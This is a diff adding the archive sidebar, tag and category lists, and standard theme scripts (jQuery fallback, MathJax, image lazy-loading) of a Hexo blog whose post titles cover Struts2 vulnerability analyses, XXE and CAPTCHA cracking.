+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/27a5d990/" >2019 All For One</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href= "/posts/9dafb9a3/" >OpenCV 初接触</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/posts/2fefc8f7/" >验证码破解系列 —— 数美</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/posts/f8004910/" >Chrome Extensions —— fir.im Downloader 编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/posts/fedef51/" >XXE 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/posts/90979812/" >Burp Extensions —— RSA Plugin 编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/posts/81dfbfaf/" >CODE BREAKING</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href= "/posts/4a17b156/" >Hello World</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/posts/970fcb23/" >OGNL Payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/posts/d34dbe44/" >s2-016 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/posts/626780ce/" >s2-032 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "/posts/617314e9/" >s2-033 & s2-037 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/posts/9cab2514/" >s2-045 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/posts/e0ca00cf/" >s2-046 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/posts/2b51554f/" >s2-048 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span><a class="archive-post-title" href= "/posts/2b51554f/" >s2-048 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/posts/dd92b54a/" >s2-053 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/posts/c43e3a51/" >s2-057 漏洞分析</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="随笔"><span class="iconfont-archer">&#xe606;</span>随笔</span>
+    
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网"><span class="iconfont-archer">&#xe606;</span>内网</span>
+    
+        <span class="sidebar-tag-name" data-tags="RedTeam"><span class="iconfont-archer">&#xe606;</span>RedTeam</span>
+    
+        <span class="sidebar-tag-name" data-tags="Burp suite"><span class="iconfont-archer">&#xe606;</span>Burp suite</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
+    
+        <span class="sidebar-tag-name" data-tags="extension"><span class="iconfont-archer">&#xe606;</span>extension</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Tomcat"><span class="iconfont-archer">&#xe606;</span>Tomcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="RCE"><span class="iconfont-archer">&#xe606;</span>RCE</span>
+    
+        <span class="sidebar-tag-name" data-tags="Weblogic"><span class="iconfont-archer">&#xe606;</span>Weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="Deserialize"><span class="iconfont-archer">&#xe606;</span>Deserialize</span>
+    
+        <span class="sidebar-tag-name" data-tags="Chrome"><span class="iconfont-archer">&#xe606;</span>Chrome</span>
+    
+        <span class="sidebar-tag-name" data-tags="cobaltstirke"><span class="iconfont-archer">&#xe606;</span>cobaltstirke</span>
+    
+        <span class="sidebar-tag-name" data-tags="Discuz"><span class="iconfont-archer">&#xe606;</span>Discuz</span>
+    
+        <span class="sidebar-tag-name" data-tags="F5"><span class="iconfont-archer">&#xe606;</span>F5</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2020-5902"><span class="iconfont-archer">&#xe606;</span>CVE-2020-5902</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
+    
+        <span class="sidebar-tag-name" data-tags="Frida"><span class="iconfont-archer">&#xe606;</span>Frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
+    
+        <span class="sidebar-tag-name" data-tags="jenkins"><span class="iconfont-archer">&#xe606;</span>jenkins</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="Redis"><span class="iconfont-archer">&#xe606;</span>Redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="struts"><span class="iconfont-archer">&#xe606;</span>struts</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="OpenCV"><span class="iconfont-archer">&#xe606;</span>OpenCV</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约"><span class="iconfont-archer">&#xe606;</span>智能合约</span>
+    
+        <span class="sidebar-tag-name" data-tags="spider"><span class="iconfont-archer">&#xe606;</span>spider</span>
+    
+        <span class="sidebar-tag-name" data-tags="smali"><span class="iconfont-archer">&#xe606;</span>smali</span>
+    
+        <span class="sidebar-tag-name" data-tags="hw2020"><span class="iconfont-archer">&#xe606;</span>hw2020</span>
+    
+        <span class="sidebar-tag-name" data-tags="深信服"><span class="iconfont-archer">&#xe606;</span>深信服</span>
+    
+        <span class="sidebar-tag-name" data-tags="0day"><span class="iconfont-archer">&#xe606;</span>0day</span>
+    
+        <span class="sidebar-tag-name" data-tags="CAPTCHA"><span class="iconfont-archer">&#xe606;</span>CAPTCHA</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="编程"><span class="iconfont-archer">&#xe60a;</span>编程</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="Pentest"><span class="iconfont-archer">&#xe60a;</span>Pentest</span>
+    
+        <span class="sidebar-category-name" data-categories="渗透"><span class="iconfont-archer">&#xe60a;</span>渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
+        <span class="sidebar-category-name" data-categories="其他"><span class="iconfont-archer">&#xe60a;</span>其他</span>
+    
+        <span class="sidebar-category-name" data-categories="验证码"><span class="iconfont-archer">&#xe60a;</span>验证码</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Sariel.D"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var i=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){i&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
+
+
